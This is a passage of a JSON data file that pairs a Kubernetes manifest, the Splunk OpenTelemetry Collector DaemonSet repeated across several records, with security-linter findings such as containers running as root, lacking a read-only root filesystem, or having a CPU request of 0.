    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prepare-fluentd-config\" does not have a read-only root file system"
  },
  {
    "id": "01494",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluentd\" is not set to runAsNonRoot"
  },
  {
    "id": "01495",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"otel-collector\" is not set to runAsNonRoot"
  },
  {
    "id": "01496",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prepare-fluentd-config\" is not set to runAsNonRoot"
  },
  {
    "id": "01497",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"otel-collector\" has cpu request 0"
  },
  {
    "id": "01498",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: LOG_FORMAT_TYPE\n          value: ''\n        volumeMounts:\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: fluentd-config-common\n          mountPath: /fluentd/etc/common\n        - name: fluentd-config-json\n          mountPath: /fluentd/etc/json\n        - name: fluentd-config-cri\n          mountPath: /fluentd/etc/cri\n      containers:\n      - name: fluentd\n        image: splunk/fluentd-hec:1.2.4\n        imagePullPolicy: IfNotPresent\n        securityContext:\n          runAsUser: 0\n        env:\n        - name: SPLUNK_MEMORY_TOTAL_MIB\n          value: '500'\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: MY_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        resources:\n          limits:\n            cpu: 500m\n            memory: 500Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: varlog\n          mountPath: /var/log\n        - name: varlogdest\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n        - name: journallogpath\n          mountPath: /run/log/journal\n          readOnly: true\n        - name: fluentd-config\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      - name: otel-collector\n        command:\n        - /otelcol\n        - --config=/conf/relay.yaml\n        - --metrics-addr=0.0.0.0:8888\n        ports:\n        - name: fluentforward\n          containerPort: 8006\n          hostPort: 8006\n          protocol: TCP\n        - name: jaeger-grpc\n          containerPort: 14250\n          hostPort: 14250\n          protocol: TCP\n        - name: jaeger-thrift\n          containerPort: 14268\n          hostPort: 14268\n          protocol: TCP\n        - name: otlp\n          containerPort: 4317\n          hostPort: 4317\n          protocol: TCP\n        - name: sfx-forwarder\n          containerPort: 9080\n          hostPort: 9080\n          protocol: TCP\n        - name: signalfx\n          containerPort: 9943\n          hostPort: 9943\n          protocol: TCP\n        - name: zipkin\n          containerPort: 9411\n          hostPort: 9411\n          protocol: TCP\n        image: quay.io/signalfx/splunk-otel-collector:0.28.0\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: K8S_NODE_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.hostIP\n        - name: K8S_POD_IP\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: status.podIP\n        - name: K8S_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: K8S_POD_UID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        - name: K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: SPLUNK_ACCESS_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-otel-collector\n              key: splunk_access_token\n        - name: HOST_PROC\n          value: /hostfs/proc\n        - name: HOST_SYS\n          value: /hostfs/sys\n        - name: HOST_ETC\n          value: /hostfs/etc\n        - name: HOST_VAR\n          value: /hostfs/var\n        - name: HOST_RUN\n          value: /hostfs/run\n        - name: HOST_DEV\n          value: /hostfs/dev\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 13133\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n        volumeMounts:\n        - mountPath: /conf\n          name: otel-configmap\n        - mountPath: /hostfs\n          name: hostfs\n          readOnly: true\n          mountPropagation: HostToContainer\n      volumes:\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: varlogdest\n        hostPath:\n          path: /var/lib/docker/containers\n      - name: journallogpath\n        hostPath:\n          path: /run/log/journal\n      - name: secrets\n        secret:\n          secretName: splunk-otel-collector\n      - name: fluentd-config\n        emptyDir: {}\n      - name: fluentd-config-common\n        configMap:\n          name: default-splunk-otel-collector-fluentd\n      - name: fluentd-config-cri\n        configMap:\n          name: default-splunk-otel-collector-fluentd-cri\n      - name: fluentd-config-json\n        configMap:\n          name: default-splunk-otel-collector-fluentd-json\n      - name: hostfs\n        hostPath:\n          path: /\n      - name: otel-configmap\n        configMap:\n          name: default-splunk-otel-collector-otel-agent\n          items:\n          - key: relay\n            path: relay.yaml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prepare-fluentd-config\" has cpu request 0"
  },
  {
    "id": "01499",
    "manifest_path": "data/manifests/the_stack_sample/sample_0479.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: default-splunk-otel-collector-agent\n  labels:\n    app: splunk-otel-collector\n    chart: splunk-otel-collector-0.28.0\n    release: default\n    heritage: Helm\n    engine: fluentd\nspec:\n  selector:\n    matchLabels:\n      app: splunk-otel-collector\n      release: default\n  template:\n    metadata:\n      labels:\n        app: splunk-otel-collector\n        release: default\n      annotations:\n        checksum/config: 90df4c65aebdd25fb4df652f9607dd45a6ab63e6fd59170427e0c2f9b68dba85\n    spec:\n      serviceAccountName: default-splunk-otel-collector\n      initContainers:\n      - name: prepare-fluentd-config\n        image: busybox:1.33\n        command:\n        - sh\n        - -c\n        args:\n        - if [ -z \"${LOG_FORMAT_TYPE}\" ]; then if [ \"$(ls /var/lib/docker/containers/*/*json.log\n          2>/dev/null | wc -l)\" != \"0\" ]; then export LOG_FORMAT_TYPE=json; else export\n          LOG_FORMAT_TYPE=cri; fi; fi; cp /fluentd/etc/common/* /fluentd/etc/${LOG_FORMAT_TYPE}/*\n          /fluentd/etc/\n        env:\n        - name: 